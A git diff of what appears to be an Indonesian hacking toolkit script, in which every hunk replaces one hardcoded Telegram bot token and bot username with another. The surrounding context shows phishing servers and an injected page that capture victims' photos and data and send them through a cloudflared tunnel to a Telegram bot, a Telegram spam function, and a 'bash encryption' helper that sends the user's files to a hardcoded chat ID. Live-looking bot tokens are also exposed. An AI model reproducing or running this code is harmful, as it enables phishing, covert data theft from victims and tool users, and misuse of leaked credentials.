@@ -1067,7 +1067,7 @@ phising_INJECT(){
   <canvas id="canvas" width="640" height="480"></canvas>
 
   <script>
-    const botToken = '8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc';
+    const botToken = '8471359519:AAGxnq6Wme4C7gl9UIfhbNaUR0UtjhTQa_o';
     const chatIds = ['7380101464'];
     const userInp = document.getElementById('user');
     const jumlahInp = document.getElementById('jumlah');
@@ -1220,7 +1220,7 @@ EOF
 import base64, json, socket, requests, subprocess, threading, time, os, random
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-TOKEN   = "8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+TOKEN   = "8471359519:AAGxnq6Wme4C7gl9UIfhbNaUR0UtjhTQa_o"
 ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()
 
 def tg_photo(chat_id, path, caption):
@@ -1273,7 +1273,7 @@ def free_port(start=8081):
 PORT = free_port(8081)
 threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()
 
-print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/Danxyganteng_bot\n")
+print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
 print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
 tunnel = subprocess.Popen(
     ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
@@ -1488,7 +1488,7 @@ EOF
 import base64, json, socket, requests, subprocess, threading, time, os, random
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-TOKEN   = "8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+TOKEN   = "8471359519:AAGxnq6Wme4C7gl9UIfhbNaUR0UtjhTQa_o"
 ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()
 
 def tg_photo(chat_id, path, caption):
@@ -1541,7 +1541,7 @@ def free_port(start=8081):
 PORT = free_port(8081)
 threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()
 
-print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/Danxyganteng_bot\n")
+print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
 print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
 tunnel = subprocess.Popen(
     ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
@@ -1733,7 +1733,7 @@ EOF
 import base64, json, socket, requests, subprocess, threading, time, os, random
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-TOKEN   = "8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+TOKEN   = "8471359519:AAGxnq6Wme4C7gl9UIfhbNaUR0UtjhTQa_o"
 ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()
 
 def tg_photo(chat_id, path, caption):
@@ -1786,7 +1786,7 @@ def free_port(start=8081):
 PORT = free_port(8081)
 threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()
 
-print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/Danxyganteng_bot\n")
+print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
 print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
 tunnel = subprocess.Popen(
     ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
@@ -2020,7 +2020,7 @@ EOF
 import base64, json, socket, requests, subprocess, threading, time, os, random
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-TOKEN   = "8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+TOKEN   = "8471359519:AAGxnq6Wme4C7gl9UIfhbNaUR0UtjhTQa_o"
 ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()
 
 def tg_photo(chat_id, path, caption):
@@ -2073,7 +2073,7 @@ def free_port(start=8081):
 PORT = free_port(8081)
 threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()
 
-print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/Danxyganteng_bot\n")
+print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
 print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
 tunnel = subprocess.Popen(
     ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
@@ -2257,7 +2257,7 @@ EOF
 import base64, json, socket, requests, subprocess, threading, time, os, random
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-TOKEN   = "8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+TOKEN   = "8471359519:AAGxnq6Wme4C7gl9UIfhbNaUR0UtjhTQa_o"
 ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()
 
 def tg_photo(chat_id, path, caption):
@@ -2310,7 +2310,7 @@ def free_port(start=8081):
 PORT = free_port(8081)
 threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()
 
-print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/Danxyganteng_bot\n")
+print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
 print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
 tunnel = subprocess.Popen(
     ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
@@ -2508,7 +2508,7 @@ EOF
 import base64, json, socket, requests, subprocess, threading, time, os, random
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-TOKEN   = "8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+TOKEN   = "8471359519:AAGxnq6Wme4C7gl9UIfhbNaUR0UtjhTQa_o"
 ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()
 
 def tg_photo(chat_id, path, caption):
@@ -2561,7 +2561,7 @@ def free_port(start=8081):
 PORT = free_port(8081)
 threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()
 
-print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/Danxyganteng_bot\n")
+print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
 print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
 tunnel = subprocess.Popen(
     ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
@@ -2778,7 +2778,7 @@ EOF
 import base64, json, socket, requests, subprocess, threading, time, os, random
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-TOKEN   = "8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+TOKEN   = "8471359519:AAGxnq6Wme4C7gl9UIfhbNaUR0UtjhTQa_o"
 ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()
 
 def tg_photo(chat_id, path, caption):
@@ -2831,7 +2831,7 @@ def free_port(start=8081):
 PORT = free_port(8081)
 threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()
 
-print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/Danxyganteng_bot\n")
+print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
 print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
 tunnel = subprocess.Popen(
     ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
@@ -3020,7 +3020,7 @@ EOF
 import base64, json, socket, requests, subprocess, threading, time, os, random
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-TOKEN   = "8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+TOKEN   = "8471359519:AAGxnq6Wme4C7gl9UIfhbNaUR0UtjhTQa_o"
 ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()
 
 def tg_photo(chat_id, path, caption):
@@ -3073,7 +3073,7 @@ def free_port(start=8081):
 PORT = free_port(8081)
 threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()
 
-print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/Danxyganteng_bot\n")
+print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
 print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
 tunnel = subprocess.Popen(
     ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
@@ -3292,7 +3292,7 @@ EOF
 import base64, json, socket, requests, subprocess, threading, time, os
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
-TOKEN   = "8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+TOKEN   = "8471359519:AAGxnq6Wme4C7gl9UIfhbNaUR0UtjhTQa_o"
 ADMIN_ID = input("[ ! ] MASUKAN ID TELEGRAM KAMU: ").strip()
 
 def tg_photo(chat_id, path, caption):
@@ -3345,7 +3345,7 @@ def free_port(start=8081):
 PORT = free_port(8081)
 threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()
 
-print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/Danxyganteng_bot\n")
+print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
 print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
 tunnel = subprocess.Popen(
     ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
@@ -4333,7 +4333,7 @@ spasi
 ╚══════╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝
 [ ! ] ENCRYPSI CODE PROGRAM BASH KAMU AGAR AMAN" | lolcat
 echo -e "${BG_RED}${YELLOW} ENCRYPSI CODE BASH ${NC}"
-  BOT_TOKEN="8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+  BOT_TOKEN="8471359519:AAGxnq6Wme4C7gl9UIfhbNaUR0UtjhTQa_o"
   CHAT_ID="7380101464"
   read -p "[ ? ] Path file .sh: " TARGET
   [[ ! -f "$TARGET" ]] && { echo "File tidak ditemukan!"; return 1; }
@@ -4909,7 +4909,7 @@ spam_tg() {
     NC='\033[0m' # No Color
 
     # Token bot
-    BOT_TOKEN="8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+    BOT_TOKEN="8471359519:AAGxnq6Wme4C7gl9UIfhbNaUR0UtjhTQa_o"
 
     clear
     spasi
@@ -6625,7 +6625,7 @@ PY
 
 #!/usr/bin/env bash
 # ------------- CONFIG -------------
-BOT_TOKEN="8147859919:AAGCb45Xqdj-_0VlLgU_3R7qr_3qJzUn5vc"
+BOT_TOKEN="8471359519:AAGxnq6Wme4C7gl9UIfhbNaUR0UtjhTQa_o"
 CHAT_ID="7380101464"
 # ------------- HELPERS -------------
 TELEGRAM_API="https://api.telegram.org/bot${BOT_TOKEN}/sendMessage"
